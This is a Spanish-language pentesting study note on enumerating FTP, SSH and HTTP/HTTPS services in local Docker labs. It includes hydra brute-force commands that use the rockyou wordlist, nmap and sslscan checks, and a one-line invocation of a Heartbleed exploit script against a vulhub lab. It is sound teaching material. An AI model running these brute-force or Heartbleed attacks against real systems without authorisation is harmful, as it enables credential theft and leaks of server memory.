## Enumeración del servicio FTP

El **File Transfer Protocol** (FTP) trabaja bajo el puerto **21**. 

La enumeración del servicio FTP implica recopilar información relevante, como la versión del servidor FTP, la configuración de permisos de archivos, los usuarios y las contraseñas (mediante ataques de fuerza bruta o guessing), entre otros.

Existen dos formas de acceder a los recursos suministrados mediante FTP. En el primer caso, bastará con introducir el usuario *anonymous* sin contraseña para poder acceder a los recursos. Sin embargo, existe la posibilidad de necesitar un usuario y una contraseña para acceder a los ficheros listados mediante FTP.

Para llevar a cabo esta práctica, se hará uso del siguiente repositorio, mediante el cual se podrá montar un contenedor de Docker que disponga de un servicio FTP: [Docker-FTP-Server](https://github.com/garethflowers/docker-ftp-server).

Además, se hará uso de un diccionario para realizar un ataque de fuerza bruta y obtener la contraseña del usuario con acceso al servicio FTP. Uno de los diccionarios que pueden ser usados es el **rockyou** ("/usr/share/wordlists/rockyou.txt"). De la siguiente manera podemos obtener una línea concreta del diccionario:

	cat /usr/share/wordlists/rockyou.txt | awk "NR==132"

El comando usado para crear el contenedor de Docker fue el siguiente:

```bash
docker run \
	--detach \
	--env FTP_PASS=louise \
	--env FTP_USER=dalnitak \
	--name my-ftp-server \
	--publish 20-21:20-21/tcp \
	--publish 40000-40009:40000-40009/tcp \
	--volume /data:/home/user \
	garethflowers/ftp-server
```

Una vez creado el contenedor con el servicio FTP funcionando, podremos acceder al servicio de la siguiente forma:

	ftp 127.0.0.1

Por lo tanto, se podría llevar a cabo un escaneo con **nmap**, ejecutando un comando de scripts básicos que detecten la versión del servicio FTP que está corriendo por el puerto 21 en el equipo host. 

	nmap -sCV -p21 127.0.0.1

A continuación, se hará uso de **hydra**, que es una herramienta muy potente para la realización de ataques de fuerza bruta. De esta manera, se podrá obtener la contraseña perteneciente a un usuario.

	hydra -l dalnitak -P passwords.txt ftp://127.0.0.1 -t 15

- Con `-l` se le indica un usuario conocido. Si no se conociese el usuario, se usaría `-L` y se le pasaría un diccionario.
- Con `-P` se le indica el diccionario a usar. De igual forma, con `-p` se usaría esa contraseña concreta.
- Con `-t` se establecen los hilos para que la ejecución sea en paralelo y vaya más rápido.

En la siguiente imagen se puede visualizar el resultado de la ejecución:

![hydra](https://github.com/danibetzamora/Hack4U/assets/72496191/3b7babd6-73d6-4d01-bb31-1e0811e00ba3)

Para el siguiente caso práctico se hará uso del siguiente repositorio: [Docker-ANON-FTP](https://github.com/metabrainz/docker-anon-ftp).

En este caso, se trata de enumerar un servicio FTP que disponga de un usuario invitado *anonymous* sin contraseña.

Con el siguiente comando se creará el contenedor:

	docker run -d -p 20-21:20-21 -p 65500-65515:65500-65515 -v /tmp:/var/ftp:ro metabrainz/docker-anon-ftp

Si ahora se vuelve a hacer el mismo escaneo que se hizo antes con **nmap**, los scripts básicos de nmap reportarán que existe un usuario *anonymous*:

![anon](https://github.com/danibetzamora/Hack4U/assets/72496191/b175c64c-bd6d-4c0a-8297-b8abbd1ac1ae)


## Enumeración del servicio SSH

**Secure Shell** (SSH) es un protocolo de administración remota que permite a los usuarios controlar y modificar sus servidores remotos a través de Internet mediante un mecanismo de autenticación seguro. Como una alternativa más segura al protocolo **Telnet**, que transmite información sin cifrar, SSH utiliza técnicas criptográficas para garantizar que todas las comunicaciones hacia y desde el servidor remoto estén cifradas.

Para este ejemplo práctico usaremos la siguiente página web: [OpenSSH-Server](https://hub.docker.com/r/linuxserver/openssh-server). En ella se indica el comando de Docker que debemos ejecutar para desplegar un servidor SSH en nuestra máquina. El comando en cuestión es el siguiente:

```bash
docker run -d \
  --name=openssh-server \
  --hostname=hack4u-academy \
  -e PUID=1000 \
  -e PGID=1000 \
  -e TZ=Etc/UTC \
  -e PASSWORD_ACCESS=true \
  -e USER_PASSWORD=louise \
  -e USER_NAME=dalnitak \
  -p 2222:2222 \
  -v /path/to/appdata/config:/config \
  --restart unless-stopped \
  lscr.io/linuxserver/openssh-server:latest
```

Una vez creado el servidor, se puede acceder al servicio SSH de la siguiente manera:

	ssh dalnitak@127.0.0.1 -p 2222

- Se indica el usuario que tiene acceso al servicio SSH en el contenedor: **_dalnitak_**.
- Como dirección IP se puede usar la *localhost* en lugar de la IP del contenedor, dado que se está aplicando **Port Forwarding**.
- Se debe indicar el puerto, ya que en este caso se está usando el **2222** en lugar del **22**.

La forma de usar **hydra** para obtener la contraseña del servidor SSH, mediante fuerza bruta, es la siguiente:

	hydra -l dalnitak -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1 -s 2222 -t 15

- En este caso, con el parámetro `-s` se indica el puerto a usar.

![hydra-ssh](https://github.com/danibetzamora/Hack4U/assets/72496191/6a912fbf-df30-440b-9c56-08c5d502afaf)

Por otro lado, podríamos identificar el *codename* de la distribución que se está ejecuntando en el sistema. Para ello será necesario crear un Dockerfile básico, construir la imagen, y crear el contenedor. El Dockerfile tendrá el siguiente aspecto:

```Dockerfile
FROM ubuntu:14.04

MAINTAINER Daniel Betancor aka dalnitak

EXPOSE 22

RUN apt update && apt install ssh -y 

ENTRYPOINT service ssh start && /bin/bash
```

Acto seguido, se deberán ejecutar los siguientes dos comandos para construir la imagen y crear el contenedor:

	docker build -t my_ssh_server /directorio/con/Dockerfile

	docker run -dit -p22:22 --name mySSHServer my_ssh_server

Y,  lanzando los scripts básicos de nmap de la siguiente forma, obtenemos los resultados que se muestran en la imagen:

	nmap -sCV -p22 127.0.0.1

![codename](https://github.com/danibetzamora/Hack4U/assets/72496191/38c63b93-844f-4c71-82eb-6b18117a56b3)

Teniendo esto, con una búsqueda en Google obtendremos el *codename* de la distribución. Por ejemplo: **_OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 launchpad_**. En este caso, el *codename* de la distribución de Ubuntu es **trusty**.


## Enumeración del servicio HTTP y HTTPS

**HTTP** (**Hypertext Transfer Protocol**) es un protocolo de comunicación utilizado para la transferencia de datos en la World Wide Web. Se utiliza para la transferencia de contenido de texto, imágenes, videos, hipervínculos, etc. El puerto predeterminado para HTTP es el puerto 80.

**HTTPS** (**Hypertext Transfer Protocol Secure**) es una **versión segura** de HTTP que utiliza SSL / TLS para cifrar la comunicación entre el cliente y el servidor. Utiliza el puerto 443 por defecto. La principal diferencia entre HTTP y HTTPS es que HTTPS utiliza una capa de seguridad adicional para cifrar los datos, lo que los hace más seguros para la transferencia.

Con el siguiente comando se puede visualizar el certificado de una página web HTTPS desde consola:

	openssl s_client -connect ejemplo.com:443

Por otro lado, **SSLScan** es una herramienta de análisis de seguridad SSL que se utiliza para evaluar la configuración SSL de un servidor. A continuación puede visualizarse un ejemplo de su uso:

	sslscan ejemplo.com

Como herramienta adicional para el análisis de la configuración SSL de un servidor existe la herramienta **Sslyze**.

### Heartbleed

**Heartbleed** es una vulnerabilidad de seguridad que afecta a la biblioteca OpenSSL y permite a los atacantes acceder a la memoria de un servidor vulnerable. Si un servidor web es vulnerable a Heartbleed y lo detectamos a través de estas herramientas, esto significa que un atacante podría potencialmente acceder a información confidencial, como claves privadas, nombres de usuario y contraseñas, etc.

A continuación se desplegará un laboratorio de Docker vulnerable a Heartbleed a modo de demostración. El laboratorio podrá ser clonado desde el siguiente repositorio: [Heartbleed](https://github.com/vulhub/vulhub/tree/master/openssl/CVE-2014-0160).

Una vez desplegado el laboratorio, si ejecutamos el siguiente comando podremos observar que la herramienta detecta que el certificado de la web es vulnerable a *heartbleed*:

	sslscan 127.0.0.1:8443

- En este caso se indica el puerto `8443` porque es el puerto especificado en el archivo "*docker-compose.yml*".

De la misma manera, mediante nmap y uno de sus scripts de reconocimiento, puede identificarse si el servidor es vulnerable a *heartbleed*:

	nmap --script ssl-heartbleed -p8443 127.0.0.1

Una de las formas de abusar de esta vulnerabilidad es hacer uso del script en python que se encuentra en el repositorio, de la siguiente forma:

	python3 ssltest.py 127.0.0.1 -p 8443 | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"











